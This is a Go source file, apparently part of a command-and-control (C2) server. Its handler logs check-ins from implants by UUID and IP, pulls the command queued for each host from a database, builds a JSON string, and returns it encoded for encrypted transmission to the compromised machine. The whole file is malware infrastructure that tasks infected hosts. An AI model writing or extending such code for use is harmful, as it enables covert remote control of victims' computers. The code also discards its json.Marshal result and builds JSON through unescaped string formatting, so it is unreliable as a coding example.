package clientApi

import (
	"C2-Server/sql3"
	json2 "encoding/json"
	"fmt"
	"github.com/gin-gonic/gin"
	"net/http"
)

func Getmsginfo(c *gin.Context, b OnlineInfo) {
	ip := c.ClientIP()
	//fmt.Println("b:",b)
	sql3.UpHostStatus(b.Uuid, ip)
	str := sql3.GetCmdType(b.Uuid)
	//fmt.Println(str)
	bc:= Getencdeo(str)
	bcd := EncodeStr(b.Uuid, string(bc))
	c.String(http.StatusOK, bcd)
}
func Getencdeo(s sql3.Client_cmd) []byte { //编码json加密传输
	json2.Marshal(s)
	fmt.Println(s)
	//clientjson := sql3.Client_cmd{}
	//jsonStr := string(jsonByte)
	a := `{"status":  200,
			"msgtype": "%s",
			"msg":"%s",
			"msgid":"%s",
			"uuid":"%s"}`
	content := []byte(fmt.Sprintf(a, s.Msgtype, s.Msg, s.Msgid, s.Uuid))
	//fmt.Println(jsonStr)
	return content
}
